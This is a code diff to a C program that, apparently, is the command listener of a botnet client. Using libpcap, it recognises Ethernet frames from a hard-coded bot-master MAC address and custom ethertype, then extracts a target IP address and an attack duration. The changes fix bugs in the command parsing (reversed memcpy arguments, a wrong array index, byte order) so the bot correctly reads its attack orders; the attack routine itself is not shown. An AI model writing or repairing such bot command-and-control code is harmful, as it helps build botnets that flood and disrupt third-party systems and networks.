@@ -60,8 +60,8 @@ void print_availiable()
 
 void extract_attack_info(const u_char *package, u_char *target_ip, u_char *attack_time)
 {
-    memcpy(package+14, target_ip, 4);
-    memcpy(package+18, attack_time, 4);
+    memcpy(target_ip, package+14, 4);
+    memcpy(attack_time, package+18, 4);
 }
 
 _Bool is_bot_command(const u_char *package)
@@ -71,17 +71,17 @@ _Bool is_bot_command(const u_char *package)
         result &= package[i] == broadcast_mac[i];
     
     for(int i=6; i<12; i++)
-        result &= package[i] == bot_master_mac[i];
+        result &= package[i] == bot_master_mac[i-6];
     
     return result && package[12] == *((u_char*)(&bot_ethertype) + 1) && package[13] == *((u_char*)(&bot_ethertype) + 0);
 }
 
 void handle_packets(u_char* user, const struct pcap_pkthdr *h, const u_char *bytes)
 {
-    printf("Packet arrived at %ld with data:\n", h->ts.tv_sec);
-    for(int i=0; i<h->caplen; i++)
-        printf("%x ", bytes[i]);
-    printf("\n\n");
+    //printf("Packet arrived at %ld with data:\n", h->ts.tv_sec);
+    //for(int i=0; i<h->caplen; i++)
+    //    printf("%x ", bytes[i]);
+    //printf("\n\n");
 
     if(is_bot_command(bytes))
     {
@@ -96,8 +96,10 @@ void handle_packets(u_char* user, const struct pcap_pkthdr *h, const u_char *byt
 
         int sec = 0;
         for(int i=0; i<4; i++)
-            *((u_char*)(&sec) + i) = attack_time[i];
-        printf("for %d seconds\n", attack_time);
+        {
+            *((u_char*)(&sec) + 3-i) = attack_time[i];
+        }
+        printf("for %d seconds\n", sec);
     }
 }
 
